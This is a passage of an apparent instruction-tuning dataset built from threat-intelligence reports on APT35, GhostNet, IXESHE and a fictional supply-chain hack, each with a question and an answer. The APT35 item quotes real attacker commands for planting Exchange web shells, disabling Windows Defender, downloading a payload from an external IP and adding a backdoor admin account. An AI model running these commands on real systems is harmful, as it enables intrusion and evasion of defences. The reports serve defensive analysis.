intriguing fictitious story. It is up to you to judge how realistic this threat would be to your organisation.\n\"My employer insists on remaining anonymous, but rest assured, he is quite resourceful. He approached me a few weeks ago with a job offer. The goal he set was quite ambitious: steal as many secrets from the government as you can. Let me tell you about the steps I took.\nFirst, I sat down to think about what I knew about the government's IT infrastructure. At a conference last fall, I had met an IT director of a ministry who had told me that all firewalls for the government were supplied by the same vendor, company Y. Hacking such a firewall was a formidable task - not something I was ready to take on directly. Instead, I took a more indirect approach.\nI logged in to LinkedIn and searched for employees of software development companies who mentioned company Y as one of their clients on their LinkedIn profile. Many professionals mention prestigious client names in their profile, even when company policy prohibits name dropping. Shortly after, I found multiple software vendors which make niche software and listed company Y as a client. I visited the vendors' websites\nand scanned their externally reachable IP addresses until I found one which had an unpatched vulnerability in their web server: company X. After a day's work, I was inside their network.\nCompany X is a small organisation and they do not feel they need network segmentation, so I was able to reach all machines on their internal network through that web server. After some more work, I was able to elevate my privileges to domain administrator, which meant I had full access to all of their systems.\nThis was where I hit a bump. I intended to change the source code of their product in such a way that it would allow me to connect remotely to the system of anyone who installed it, but I had never done that before. I then decided to log on to a hacker forum and posted a request for help. I offered 10,000 euros reward for a job well done. After a while, I was approached by someone who was willing to help me. I asked around to confirm his reputation in this field. I enlisted his help in modifying the source code of the main product of company X.\nThe security policies of company Y were very strict: only the system administrators can install software on the workstations, and both incoming and outgoing traffic goes through a proxy server. Luckily, the virus which my associate hacker had written communicates through DNS, which was not actively monitored or filtered. The software from company X was updated on a regular basis, and after three weeks I received a message which indicated that I had access to their workstations.\nI called on my associate hacker once more, but this time for a more advanced task: reprogramming the firmware of the firewalls which company Y produces. He indicated that he needed the help of a contact who installed a backdoor in all firewalls for another 20,000 euros. Now, all I needed to do was wait for the next update of the firmware. I posted some fake security vulnerabilities for the current version of this firmware, to ensure that the firmware would be upgraded timely. And slowly but surely, I gained access to all internal networks of the government.\nI could then route any traffic which flows through any government network through my own computer. I can also read all emails which are sent between government employees internally. I can find vulnerable servers by scanning the networks. In almost all the internal networks, I have found at least one server which I can exploit. I installed backdoors on hundreds of workstations which allows me the ability to monitor email servers, so emails with interesting attachments can be forwarded to me. Additionally, I have obtained login credentials for almost all major government databases.\nEvery day, almost two hundred gigabytes of government secrets are sent to me automatically. This amount is only limited by the amount of bandwidth I can get, and the number of hard disk drives I install. I'm being paid 100 euros per gigabyte of information. I will leave it to you to calculate my hourly wage.\"\n\u00a9 2012\nThe sad truth is that cybercrime is here to stay. A report by the Government Accountability Office indicated that 24 key government agencies in the United States have logged a 650 percent increase in cyber security incidents in 2011 compared to five years ago.\nAccording to a survey by KPMG Netherlands, 49 percent of organisations have experienced some form of cybercrime activity during the past 12 months while the remaining may not even have proper detection measures in place.\nAmong the 49 percent, 10 percent indicated that they have been attacked more than 100 times within the past year. The remaining respondents said they were attacked successfully up to five times last year. Most of the incidents were not covered by the media and are therefore not publicly known.\nRead the text above and answer this question: What role did social engineering and external resources play in the ethical hacker's strategy to compromise the government's IT infrastructure?",
    "output": "Social engineering played a crucial role in the ethical hacker's strategy. He utilized LinkedIn to identify potential targets by searching for employees who mentioned company Y as a client. This allowed him to find a weak link in the supply chain. Additionally, he leveraged external resources by posting a request for help on a hacker forum, offering a financial reward. This enabled him to enlist the assistance of an associate hacker who had the expertise to modify the source code and reprogram the firewall firmware, thereby facilitating the infiltration of the government's IT infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Services\nWe offer multiple services including a  which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found .\nWe also have artifacts and IOCs available from this case such as pcaps, memory captures, (<https://www.patreon.com/thedfirreport>)files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\nBig Headline: Initial Access\nCVE-2021-34473\nCVE-2021-34523\nCVE-2021-31207\nWith the appropriate (<https://www.mandiant.com/resources/greater-visibilityt>)PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.\nOnce the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:\nNew-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User \"administrator@<REDACTED>\"\nThe threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension. While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.\nNew-MailboxExportRequest -Mailbox \"administrator@<REDACTED>\" -FilePath \"\\\\localhost\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\aspx_wkggiyvttmu.aspx\" -IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_wkggiyvttmu'\"\nIn an attempt to hide the actions taken, the actor removes the request just created:\nRemove-MailboxExportRequest -Confirm \"False\" -Force \"True\" -Identity \"77a883a7-470c471c-a193-f4c54f263fde\"\nThis activity then repeated approximately 2 days after the initial exploitation. As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated. Below is the second web shell created that shares the same naming convention as the first.\nNew-MailboxExportRequest -Mailbox \"administrator@<REDACTED>\" -FilePath \"\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\system_web\\aspx_dyukbdcxjfi.aspx\" -IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_dyukbdcxjfi'\"\nBig Headline: Execution\nApproximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.\nThe web shell followed a similar structure seen in previous cases. At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran. The web shell had predefined functions for special actions:\nget \u2013 Get file from location on disk (additional dst POST parameter)\nput \u2013 Upload file to location (additional dst POST parameter)\nrun \u2013 Execute a list of commands separated by \";\" using PowerShell.\nIf exec_code does not start with one of the above commands, it will simply attempt to run it with PowerShell.\nThe environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself. Below you can see an example of commands that were sent and the outputs they returned in the response.\nThe actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell. This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.\nScheduled Task Commands:\nschtasks.exe /Create /F /XML C:\\windows\\temp\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\nschtasks.exe /Run /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\nDefender Modification Command:\ntry {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\nStart-Process powershell.exe {$file='c:\\windows\\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file}\nThe schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell. Wininet.bat simply loops through the execution of the file dllhost.exe .\nThe file dllhost.exe is a golang binary. When executed, the binary was observed resolving the following domains:\napi.myip[.]com (for discovery)\ntcp443.msupdate[.]us\nkcp53.msupdate[.]us\nThe binary also spawns the following commands when executed:\ncmd /c wmic computersystem get domain\npowershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\nThe (<https://www.virustotal.com/gui/file/1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e/community>)binary has a low confidence reference to FRP ((<https://github.com/fatedier/frp>)FastReverseProxy) as the sample matches the closed source Yara rule \u2013 (<https://valhalla.nextron-systems.com/info/rule/HKTL_PUA_FRP_FastReverseProxy_Oct21_1>)HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by Florian Roth) however it does not behave in the same way as the open source tool. This file also matches on an additional Yara rule more recently \u2013\nMedium Headline: New account creation\nDuring the first activity, we observed the use of user.exe executable that ran the following PowerShell command:\npowershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount\nThe first thing they did was make a new user named DefaultAccount with the password P@ssw0rd123412 . They then activated the account and changed the password ( P@ssw0rd12341234 ) for the second time. Finally the commands added the new account to the Administrators group and Remote Desktop Users group.\nThe threat actors ran the same command again two days later:\npowershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount\nDue to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.\nBig Headline: Defense Evasion\nUsing PowerShell the threat actors issued several commands to impair Windows Defender including:\nWindows Defender Behavior Monitoring was disabled.\nThe Severe Threat default action was set to 'Allow'.\nRealtime Monitoring was disabled.\nThe 'C:\\Windows' path was excluded from scheduled and real-time scanning.\ntry {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\n\nBased on the above text, answer a question. What methods did APT35 employ to evade detection and impair Windows Defender during their attack? Explain the purpose of each command used in this process.",
    "output": "APT35 employed several methods to evade detection and impair Windows Defender. They used PowerShell commands to disable behavior monitoring, set the severe threat default action to 'Allow', disable real-time monitoring, and exclude the 'C:\\Windows' path from scanning. The specific commands used were 'Set-MpPreference -DisableBehaviorMonitoring 1', 'Set-MpPreference -SevereThreatDefaultAction Allow', 'Set-MpPreference -DisableRealtimeMonitoring 1', and 'Add-MpPreference -ExclusionPath 'C:\\Windows''. These commands collectively aimed to reduce the effectiveness of Windows Defender, making it easier for the threat actors to operate undetected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Discovery\nThe threat actors used native Windows binaries to enumerate the exploited server in an automated fashion. They executed commands such as:\nnet.exe user\nipconfig.exe /all\npowershell.exe (multiple commands)\nquser.exe\nThese discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.\nThey used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.\nGet-WMIObject Win32_NTDomain | findstr DomainController\nAdditionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command. This was likely done as a test.\nAdd-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\"\nMedium Headline: Sigma\nLocal Accounts Discovery \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_local_system_owner_account_discovery.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_local_system_owner_account_discovery.yml\nLsass Memory Dump via Comsvcs DLL \u2013 (<https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml>)https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/ rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml\nNet.exe Execution \u2013 (<https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml>)https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/ rules/windows/process_creation/win_susp_net_execution.yml\nNet-exe User Account Creation \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_net_user_add.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_net_user_add.yml\nNetsh Port or Application Allowed \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_fw_add.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_netsh_fw_add.yml\nNetsh RDP Port Opening \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_allow_port_rdp.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_netsh_allow_port_rdp.yml\nNon Interactive PowerShell \u2013 (<https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rules/windows/process_creation/win_non_interactive_powershell.yml>)https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/ru les/windows/process_creation/win_non_interactive_powershell.yml\nPowershell Defender Exclusion \u2013 (<https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/rules/windows/process_creation/win_powershell_defender_exclusion.yml>)https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/r ules/windows/process_creation/win_powershell_defender_exclusion.yml\nPowerShell Get-Process LSASS \u2013 (<https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rules/windows/process_creation/win_susp_powershell_getprocess_lsass.yml>)https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/ru les/windows/process_creation/win_susp_powershell_getprocess_lsass.yml\nProcess Dump via Comsvcs DLL \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_susp_comsvcs_procdump.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_susp_comsvcs_procdump.yml\nQuick Execution of a Series of Suspicious Commands \u2013 (<https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_multiple_suspicious_cli.yml>)https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/ rules/windows/process_creation/win_multiple_suspicious_cli.yml\nRare Scheduled Task Creations \u2013 (<https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/other/taskscheduler/win_rare_schtask_creation.yml>)https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/ru les/windows/other/taskscheduler/win_rare_schtask_creation.yml\nService Execution \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_service_execution.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_service_execution.yml\nShells Spawned by Web Servers \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_webshell_spawn.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_webshell_spawn.yml\nSuspicious PowerShell Parent Process \u2013 (<https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rules/windows/process_creation/win_susp_powershell_parent_process.yml>)https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/ rules/windows/process_creation/win_susp_powershell_parent_process.yml\nSuspicious Script Execution From Temp Folder \u2013 (<https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_susp_script_exec_from_temp.yml>)https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/ rules/windows/process_creation/win_susp_script_exec_from_temp.yml\nWdigest Enable UseLogonCredential \u2013 (<https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml>)https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/ rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml\nWebshell Detection With Command Line Keywords \u2013 (<https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03/rules/windows/process_creation/win_webshell_detection.yml>)https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03 /rules/windows/process_creation/win_webshell_detection.yml\nWindows Defender Real-Time Protection Disabled \u2013 (<https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml>)https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r ules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml\nWindows Defender Threat Detection Disabled \u2013 (<https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_disabled.yml>)https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r ules/windows/registry_event/registry_event_defender_disabled.yml\nWindows Shell Spawning Suspicious Program \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_shell_spawn_susp_program.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_shell_spawn_susp_program.yml\nWindows Suspicious Use Of Web Request in CommandLine \u2013 (<https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8/rules/windows/process_creation/process_creation_susp_web_request_cmd.yml>)https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8 /rules/windows/process_creation/process_creation_susp_web_request_cmd.yml\nWindows Webshell Creation \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/file_event/sysmon_webshell_creation_detect.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/file_event/sysmon_webshell_creation_detect.yml\n\nHow did APT35 leverage native Windows binaries to enumerate the exploited server, and what specific commands were used? Additionally, explain the significance of using these commands in the context of their automated discovery tasks.",
    "output": "APT35 used native Windows binaries to enumerate the exploited server in an automated fashion. The specific commands executed included 'net.exe user', 'ipconfig.exe /all', 'powershell.exe (multiple commands)', and 'quser.exe'. These discovery tasks were executed via a web shell. The threat actors also used the PowerShell module Get-WMIObject to collect the name and IP address of the domain controller with the command 'Get-WMIObject Win32_NTDomain | findstr DomainController'. Additionally, they retrieved an email address from the compromised Exchange server using the command 'Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders'. The significance of using these commands is that they allow the threat actors to gather critical information about the server environment, such as user accounts, network configurations, and domain controllers, which can aid in further exploitation and lateral movement within the network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: Office of His Holiness the Dalai Lama\nThe OHHDL is the personal office of the Dalai Lama. The OHHDL provides secretarial assistance and is responsible for all matters related to the Dalai Lama and acts on his behalf. It is worth noting that the OHHDL's primary responsibilities include organization of the Dalai Lama's international schedule, handling all diplomatic, governmental and personal correspondence, and acting as the liaison between the Dalai Lama and officials of the Tibetan Government-in-Exile (TGIE) and the Offices of Tibet (OOT) worldwide. Therefore the OHHDL's computer network is continuously transmitting and receiving extremely sensitive data.\nWhile the Office does not have any secrets, it is essentially the hub of the Tibetan movement and thus handles strategic, time-sensitive communications. Examples of these communications include scheduling meetings with world leaders, and, since 2002, coordinating the negotiations between the People's Republic of China and Dharamsala.\nOn September 10, 2008, we used Wireshark to capture packets from an OHHDL computer named xxxxxx. We chose xxxxxxx from among 23 computers on the OHHDL internal network due to time constraints and consultations with office staff to identify the computers most likely to be infected, such as those operated by relatively inexperienced users vulnerable to social engineering techniques, or those handling particularly sensitive data.\nAn analysis of the data collected reveals that this computer was compromised by malware that was in interactive communication with identified control servers. The infected computer connected to\n40 http://www.businessweek.com/print/magazine/content/08_16/b4080032218430.htm\nFig. 4\nField researchers discovered malware at five Tibetan locations.\nA Palantir screen capture showing the Tibetan organizations at which we conducted field research and the connections from infected computers at these locations and various control servers located in China. The locations at which we found evidence of infection are:  the Office of His Holiness the Dalai Lama, the Tibetan Government-in-Exile, the Offices of Tibet in New York City and London and the Tibetan activist NGO, Drewla.\nfour different IP addresses, each with a somewhat different method. While there are four groupings of communications between the infected computer and the control servers, they are related such that there appear to be two distinct families of malware. In both cases, the malware uses the protocol for standard web traffic, HTTP, in order make the network activity appear as if it were normal Internet browsing.\nThe first family of malware used HTTP connections to connect to PHP files.41 Despite connecting to different IP addresses and requesting different files, both used the same unique key when communicating, indicating that they are part of the same family of malware.\n1) The malware made connections to a control server on IP address xxxxxxxxxxxx using two host names, xxxxxxxxxxxxxxxx and xxxxxxxxxxxxxxxxxx. The IP address xxxxxxxxx is in a range assigned to Hainan-TELECOM (xxxxxxxxxxxxxxxxxxxxxxxx\nxxxxxxxxxxxxxxxxx) in China. The malware used HTTP to connect to various PHP files on the control server in order to update its status and receive instructions about where to download commands. The commands are embedded in what appear to be image files (e.g. JPEG).\n2) The malware made connections to a control server on IP address xxxxxxxxxxx, port 8000. This IP address reverse resolved to xxxxxxxxxxx.broad.hk.hi.dynamic.163data. com.cn and is in an IP range assigned to Hainan-TELECOM (HAIFU node adsl dialup ports) in China. The malware used HTTP POST to upload content to the control server.42\nThe investigation carried out in Phase 2 identified the network of control servers used in this particular attack. The control servers we discovered include the control server used in the well-documented instances of social malware used frequently against Tibetan targets during the 2008 Olympics in Beijing.\nThe second family of malware used HTTP POST to connect to a CGI43 script to communicate between the infected computer and the control server. While their functions appear to be different, with one malware focusing on reporting and commands and the other on document retrieval, they are likely part of the same family of malware. In addition, the domain names used, www.lookbytheway.net and www. macfeeresponse.org, are registered to the same person, \"zhou zhaojun\" (losttemp33@hotmail.com).\n1) The malware made connections to a control server on IP address 221.5.250.98 using the host name www.lookbytheway.net. The IP address 221.5.250.98 is assigned to CNCGROUP-CQ (CNC Group CHINA169 Chongqing Province Network) in China. The malware on the infected computer used HTTP to connect to a file in an attempt to inform the control server of the infected computer's status and to download commands.\nIn one case, the file the infected computer was requesting was not present and the infected computer received a 404 error. However, successful connections were made via HTTP to CGI scripts. The infected computer used HTTP POST to submit data to CGI scripts hosted on the control server.\n2) The malware made connections to a control server on 218.241.153.61 using the host name www.macfeeresponse.org. The IP address 218.241.153.61 is assigned to BITNET (Beijing Bitone United Networks) in Beijing, China. The malware on the infected computer used HTTP to connect to a file to inform the control server of the infected computer's status and download commands. In addition, connections were made via HTTP to CGI scripts. The infected computer used HTTP POST to submit data to CGI scripts hosted on the control server. Connections to one CGI script appear to inform the control server of the presence of particular documents, while connections to a second CGI script appear to cause the infected computer to upload documents to the control server using HTTP POST.\n41 PHP is a popular scripting language often used in web applications.\n42 HTTP POST is a method often used to upload content to a web server.\n43 CGI scripts are often written in the Perl programming language.\nInstances of malware that connect to control server locations www.lookbytheway.net and www. macfeeresponse.org have been analysed by security companies.44 This network extends to a variety of domain names including:\n\u2022 www.lookbytheway.com \u2013 210.51.7.155\n\u2022 www.macfeeresponse.com - 210.51.7.155\n\u2022 www.msnppt.net - 221.5.250.98\n\u2022 www.msnxy.net - 210.51.7.155\n\u2022 www.msnyf.com - 221.5.250.98\n\u2022 www.networkcia.com - 210.51.7.155\n\u2022 www.indexnews.org - 61.188.87.58\n\u2022 www.indexindian.com - 210.51.7.155\nDuring the in situ investigation at the Dalai Lama's private office we observed several documents being exfiltrated from the computer network and uploaded to www.macfeeresponse.org, including a document containing thousands of email addresses and one detailing and discussing the Dalai Lama's envoy's negotiating position. (see Fig. 5 - p. 26)\nOur investigators did not have access to the stolen documents for reasons of confidentiality. However, we can assume their significance to Sino-Tibetan negotiations. One example is the fact that GhostNet penetrated computers of organizations involved in China-TGIE negotiations.45\n44 See, http://www.threatexpert.com/report.aspx?md5=79f7f4695b8878cf1760e8626129ca88 and http://www.threatexpert.com/report. aspx?md5=ea03a7359505e19146994ad77b2a1e46\n45 Lodi Gyari is the lead person designated by the Dalai Lama to coordinate negotiations with the Chinese government. Our invesigator interviewed him in December 2008 in Delhi. We briefed him on our ongoing investigation and offered advice on information security while engaged in negotiations in Beijing. Lodi Gyari is also the Executive Chairman of the Board of the International Campaign for Tibet (ICT), an independent Washington-based human rights advocacy group. (Note that our investigation uncovered that seven of ICT's computers were compromised by GhostNet).\nFig. 5\nMalware retrieving a sensitive document.\nThis screen capture of the Wireshark network analysis tool shows an infected computer at the Office of His Holiness the Dalai Lama uploading a sensitive document to one of the CGI network's control servers.\nSmall Headline: Tibetan Government-in-Exile (TGIE)\nOn September 11, 2008, Wireshark was used to capture packets from a TGIE computer xxxxxxx. An analysis revealed that this computer was compromised by malware which sent communication to, and received communication from, control servers.\nThe malware made connections to a control server on 221.10.254.248 using the host name 927. bigwww.com. The IP address 221.10.254.248 is assigned to CNCGROUP-SC (CNC Group CHINA169 Sichuan Province Network) in China. The malware on the infected computer used HTTP to connect to a JPEG file, which was not an image file but instead contains an IP address and port number (124.135.97.21:8005). This IP address, 124.135.97.21, is assigned to CNCGROUP-SD (CNC Group CHINA169 Shandong Province Network) in China.\nVery Small Headline: London\nOn October 1, 2008 Wireshark was used to capture packets from a computer in the London OOT. An analysis revealed that this computer was compromised by malware which sent communication to, and received communication from, control servers.\nThe malware made connections to a control server on 58.141.132.66 using the hostname oyd.3322. org on port 4501. The IP address 58.141.132.66 is assigned to NamBu TV in Seoul, South Korea. 3322. org is a Chinese dynamic domain service.\nVery\nQ: How did the GhostNet APT leverage HTTP protocols to disguise its malicious activities within the OHHDL computer network, and what were the specific techniques used by the malware?",
    "output": "The GhostNet APT leveraged HTTP protocols to disguise its malicious activities by making the network activity appear as normal Internet browsing. The malware used HTTP connections to connect to PHP files and HTTP POST to connect to CGI scripts. Specific techniques included embedding commands in image files (e.g., JPEG), using HTTP POST to upload content to control servers, and connecting to various control servers located in China. The malware also used unique keys and domain names registered to the same person to maintain communication with the control servers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nThe number of targeted attacks is undoubtedly on the rise. These highly targeted attacks focus on individual organizations in an effort to extract valuable information. In many ways, this is a return to the \"old hacking days\" before more widespread attacks targeting millions of users and the rise of computer worms came about. Sometimes, these targeted attacks are allegedly linked to state-sponsored activities but may also be carried out by individual groups with their own goals.\nTrend Micro continues to track and analyze highly targeted attacks, also known as \"advanced persistent threats (APTs).\" We have, in fact, published two research papers on the Luckycat1 and Lurid2 campaigns. This research paper will delve into another prominent group of attackers referred to as \"IXESHE\" (pronounced \"i-sushi\"), based on one of the more common detection names security companies use for the malware they utilize. This campaign is notable for targeting East Asian governments, electronics manufacturers, and a telecommunications company.\nThe IXESHE campaign makes use of targeted emails with malicious attachments to compromise victims' systems. The emails are often tailored for specific victims and contain malicious attachments that are almost always \"weaponized\" .PDF files with known exploits that drop malware executables onto targeted systems. In addition, the IXESHE attackers conducted two specific attacks that leveraged zero-day exploits\u2014one in 2009 and another in 2011.\n1\n2\nThe IXESHE attackers almost always make use of compromised servers as command-and-control (C&C) servers. In some cases, the compromised servers are hosted on target organizations' networks after successful infiltration so the attackers can increase their control of the victims' infrastructure. Using this approach, the attackers amassed at least 60 C&C servers over time. This technique also allows the attackers to cover their tracks, as having the C&C server in the victims' corporate networks means very little C&C traffic leaves them. The attackers' deliberate use of compromised machines and dynamic Domain Name System (DNS) services allows them to hide traces of their presence by confusing their activities with data belonging to legitimate individuals.\nLooking at threat intelligence derived from tracking APT campaigns over time primarily based on the network traffic generated by the malware used, we were able to develop indicators of compromise for the IXESHE campaign. The malware samples used in this campaign were not very complicated by nature but do give the attackers almost complete control over their targets' compromised systems.\n\nBased on the above text, answer a question. What strategy did the IXESHE attackers employ to establish command-and-control (C&C) servers, and how did this strategy benefit their operations?",
    "output": "The IXESHE attackers employed a strategy of using compromised servers as command-and-control (C&C) servers. In some cases, these compromised servers were hosted on the target organizations' networks after successful infiltration. This approach allowed the attackers to increase their control over the victims' infrastructure. By hosting C&C servers within the victims' corporate networks, the attackers minimized the amount of C&C traffic leaving the networks, making it harder for defenders to detect their activities. Additionally, the use of compromised machines and dynamic DNS services helped the attackers hide their presence by blending their activities with those of legitimate users, further complicating detection efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
